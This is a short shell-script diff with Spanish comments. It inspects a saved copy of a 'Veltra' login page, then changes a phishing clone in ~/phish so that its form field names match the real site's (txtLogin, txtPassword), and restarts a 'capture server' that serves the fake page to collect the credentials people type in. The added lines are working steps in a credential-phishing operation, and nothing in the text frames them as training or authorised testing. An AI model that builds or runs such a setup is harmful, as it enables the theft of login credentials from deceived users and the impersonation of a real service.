@@ -5,3 +5,13 @@ echo "=== tamaño ==="; wc -c ~/veltra_login.html
 echo "=== scripts que carga ==="; grep -oE '<script[^>]*>' ~/veltra_login.html
 echo "=== hay algo inline (onload/onerror/on...)? ==="; grep -oiE 'on[a-z]+=' ~/veltra_login.html | sort -u
 echo "=== HTML completo ==="; cat ~/veltra_login.html
+
+
+
+# 1. cambiar los nombres de campo para que matcheen el Veltra real
+sed -i 's/name="usuario"/name="txtLogin"/; s/name="clave"/name="txtPassword"/' ~/phish/index.html
+echo "=== nombres ahora ==="; grep -oE 'name="[^"]*"' ~/phish/index.html
+
+# 2. reiniciar el servidor de captura (lee el HTML al arrancar)
+pkill -f serve.py; sleep 1; cd ~/phish && python3 serve.py
+
